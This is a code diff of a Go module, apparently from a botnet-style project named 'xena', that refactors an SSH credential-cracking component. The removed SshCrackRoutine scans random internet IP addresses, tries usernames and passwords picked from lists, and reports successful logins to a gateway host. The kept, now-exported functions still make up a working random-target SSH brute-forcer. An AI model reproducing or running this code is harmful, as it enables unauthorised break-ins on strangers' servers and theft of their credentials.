@@ -1,53 +1,26 @@
 package modules
 
 import (
-	"fmt"
 	"math/rand"
 	"strconv"
 	"time"
-	"xena/services"
 
 	"golang.org/x/crypto/ssh"
 )
 
-// SshCrackRoutine is an infinite loop of cracking SSH service.
-func SshCrackRoutine(gatewayHost string) {
-	for {
-		address := ipRandomAddress()
-		user := randomSshUser()
-		pass := randomSshPass()
-		err := sshCheck(address, user, pass, 22)
-		if err != nil {
-			fmt.Println(err)
-			continue
-		}
-		// Temp hardcoded.
-		err = services.SubmitCreds(gatewayHost, services.Creds{
-			Ip:   address,
-			Port: 22,
-			User: user,
-			Pass: pass,
-		})
-		if err != nil {
-			fmt.Println(err)
-			continue
-		}
-	}
-}
-
-// ipChunk returns a string composed of numbers between 1 - 255.
-func ipChunk() string {
+// IpChunk returns a string composed of numbers between 1 - 255.
+func IpChunk() string {
 	rand.Seed(time.Now().UnixNano())
 	return strconv.Itoa(rand.Intn(253) + 1)
 }
 
-// ipRandomAddress returns a random IP address.
-func ipRandomAddress() string {
-	return ipChunk() + "." + ipChunk() + "." + ipChunk() + "." + ipChunk()
+// IpRandomAddress returns a random IP address.
+func IpRandomAddress() string {
+	return IpChunk() + "." + IpChunk() + "." + IpChunk() + "." + IpChunk()
 }
 
-// sshCheck returns nil if the credentials are correct.
-func sshCheck(ip, user, pass string, port int) error {
+// SshCheck returns nil if the credentials are correct.
+func SshCheck(ip, user, pass string, port int) error {
 	_, err := ssh.Dial("tcp", ip+":"+strconv.Itoa(port), &ssh.ClientConfig{
 		User:            user,
 		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
@@ -61,14 +34,14 @@ func sshCheck(ip, user, pass string, port int) error {
 	return nil
 }
 
-// randomSshUser returns a random username from sshUserList.
-func randomSshUser() string {
+// RandomSshUser returns a random username from sshUserList.
+func RandomSshUser() string {
 	rand.Seed(time.Now().UnixNano())
 	return sshUserList[rand.Intn(len(sshUserList))]
 }
 
-// randomSshPass returns a random password from sshPassList.
-func randomSshPass() string {
+// RandomSshPass returns a random password from sshPassList.
+func RandomSshPass() string {
 	rand.Seed(time.Now().UnixNano())
 	return sshPassList[rand.Intn(len(sshPassList))]
 }
